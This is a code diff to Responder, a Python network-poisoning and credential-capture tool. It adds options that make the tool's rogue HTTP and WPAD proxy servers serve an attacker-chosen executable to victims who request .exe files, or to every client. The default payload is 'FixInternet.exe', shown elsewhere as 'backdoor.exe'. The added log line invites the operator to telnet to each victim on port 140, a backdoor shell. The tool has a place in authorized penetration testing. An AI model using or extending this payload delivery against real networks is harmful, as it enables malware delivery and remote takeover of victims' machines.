@@ -57,6 +57,12 @@ parser.add_option('-w','--wpad', action="store", dest="WPAD_On_Off", help = "Set
 
 parser.add_option('--lm',action="store", help="Set this to 1 if you want to force LM hashing downgrade for Windows XP/2003 and earlier. Default value is False (0)", metavar="0",dest="LM_On_Off", choices=['0','1'], default="0")
 
+parser.add_option('-e',action="store", help="Set this option to 1 if you'd like to serve a specific file via http & WPAD proxy server when  one of these extensions are present in the url. Default value is False (0)", metavar="0",dest="Exe_On_Off", choices=['0','1'], default="0")
+
+parser.add_option('--exe',action="store", help="Set this option to 1 if you'd like to always serve a specific file via http & WPAD proxy server. It's best to use this option with the --file option. Default value is False (0)", metavar="0",dest="Exec_Mode_On_Off", choices=['0','1'], default="0")
+
+parser.add_option('--file',action="store", help="Serve a specific file when using -e option. Default is FixInternet.exe (provided with Responder)", metavar="backdoor.exe",dest="FILENAME", default="FixInternet.exe")
+
 options, args = parser.parse_args()
 
 if options.OURIP is None:
@@ -79,6 +85,9 @@ OURIP = options.OURIP
 BOUND_TO_IP = options.BOUND_TO_IP
 Basic = options.Basic
 On_Off = options.on_off.upper()
+Exe_On_Off = options.Exe_On_Off
+Exec_Mode_On_Off =options.Exec_Mode_On_Off
+FILENAME = options.FILENAME
 SSL_On_Off = options.SSL_On_Off.upper()
 SMB_On_Off = options.SMB_on_off.upper()
 SQL_On_Off = options.SQL_on_off.upper()
@@ -122,7 +131,7 @@ Challenge = ""
 for i in range(0,len(NumChal),2):
     Challenge += NumChal[i:i+2].decode("hex")
 
-Show_Help("[+]NBT-NS & LLMNR responder started\nGlobal Parameters set:\nChallenge set is: %s\nWPAD Proxy Server is:%s\nHTTP Server is:%s\nHTTPS Server is:%s\nSMB Server is:%s\nSMB LM support is set to:%s\nSQL Server is:%s\nFTP Server is:%s\nDNS Server is:%s\nLDAP Server is:%s\nFingerPrint Module is:%s\n"%(NumChal,WPAD_On_Off,On_Off,SSL_On_Off,SMB_On_Off,LM_On_Off,SQL_On_Off,FTP_On_Off,DNS_On_Off,LDAP_On_Off,Finger_On_Off))
+Show_Help("[+]NBT-NS & LLMNR responder started\nGlobal Parameters set:\nChallenge set is: %s\nWPAD Proxy Server is:%s\nHTTP Server is:%s\nHTTPS Server is:%s\nSMB Server is:%s\nSMB LM support is set to:%s\nSQL Server is:%s\nFTP Server is:%s\nDNS Server is:%s\nLDAP Server is:%s\nFingerPrint Module is:%s\nServing Executable via HTTP&WPAD is:%s\nAlways serving executable via HTTP&WPAD is:%s\n\n"%(NumChal,WPAD_On_Off,On_Off,SSL_On_Off,SMB_On_Off,LM_On_Off,SQL_On_Off,FTP_On_Off,DNS_On_Off,LDAP_On_Off,Finger_On_Off,Exe_On_Off,Exec_Mode_On_Off))
 
 #Simple NBNS Services.
 W_REDIRECT   = "\x41\x41\x00"
@@ -913,11 +922,44 @@ def Basic_Ntlm(Basic):
     if Basic == "0":
        return IIS_Auth_401_Ans()
 
+def ServeEXE(data,client, Filename):
+    Message = "[+]Exe file sent to: %s . Try telnet %s on port 140"%(client,client)
+    print Message
+    logging.warning(Message)
+    with open (Filename, "rb") as bk:
+       data = bk.read()
+       bk.close()
+       return data
+
+def ServeEXEOrNot(on_off):
+    if Exe_On_Off == "1":
+       return True
+    if Exe_On_Off == "0":
+       return False
+
+def ServeEXECAlwaysOrNot(on_off):
+    if Exec_Mode_On_Off == "1":
+       return True
+    if Exec_Mode_On_Off == "0":
+       return False
+
+Exec_Mode_On_Off
+
 #Handle HTTP packet sequence.
 def PacketSequence(data,client):
     a = re.findall('(?<=Authorization: NTLM )[^\\r]*', data)
     b = re.findall('(?<=Authorization: Basic )[^\\r]*', data)
     c = re.findall('(?<=wpad.dat )[^\\r]*', data)
+    if ServeEXEOrNot(Exe_On_Off) and re.findall('.exe', data):
+       payload = ServeEXE(data,client,FILENAME)
+       buffer1 = ServerExeFile(Payload = payload,filename=FILENAME)
+       buffer1.calculate()
+       return str(buffer1)
+    if ServeEXECAlwaysOrNot(Exec_Mode_On_Off):
+       payload = ServeEXE(data,client,FILENAME)
+       buffer1 = ServeAlwaysExeFile(Payload = payload,ContentDiFile=FILENAME)
+       buffer1.calculate()
+       return str(buffer1)
     if a:
        packetNtlm = b64decode(''.join(a))[8:9]
        if packetNtlm == "\x01":
@@ -943,7 +985,6 @@ def PacketSequence(data,client):
        buffer1 = IIS_Auth_Granted()
        buffer1.calculate()
        return str(buffer1)
-
     if c:
        GrabCookie(data,client)
        buffer1 = IIS_Auth_Redir()
@@ -969,8 +1010,8 @@ class HTTP(SocketServer.BaseRequestHandler):
               if buff:
                  self.request.send(buff)
               else:
-                 buffer0 = PacketSequence(data,self.client_address[0])      
-                 self.request.send(buffer0)
+                 buffer0 = PacketSequence(data,self.client_address[0])
+                 self.request.sendall(buffer0)
         except Exception:
            pass#No need to be verbose..
            self.request.close()
@@ -1035,6 +1076,16 @@ def ParseDomain(data,client):
 def ProxyPacketSequence(data,client):
     a = re.findall('(?<=Proxy-Authorization: NTLM )[^\\r]*', data)
     b = re.findall('(?<=Authorization: Basic )[^\\r]*', data)
+    if ServeEXEOrNot(Exe_On_Off) and re.findall('.exe', data):
+       payload = ServeEXE(data,client,FILENAME)
+       buffer1 = ServerExeFile(Payload = payload, filename=FILENAME)
+       buffer1.calculate()
+       return str(buffer1)
+    if ServeEXECAlwaysOrNot(Exec_Mode_On_Off):
+       payload = ServeEXE(data,client,FILENAME)
+       buffer1 = ServeAlwaysExeFile(Payload = payload,ContentDiFile=FILENAME)
+       buffer1.calculate()
+       return str(buffer1)
     if a:
        packetNtlm = b64decode(''.join(a))[8:9]
        if packetNtlm == "\x01":
@@ -1075,7 +1126,7 @@ class HTTPProxy(SocketServer.BaseRequestHandler):
              data = self.request.recv(8092)
              ParseDomain(data,self.client_address[0])
              buffer0 = ProxyPacketSequence(data,self.client_address[0])      
-             self.request.send(buffer0)
+             self.request.sendall(buffer0)
 
         except Exception:
            pass#No need to be verbose..
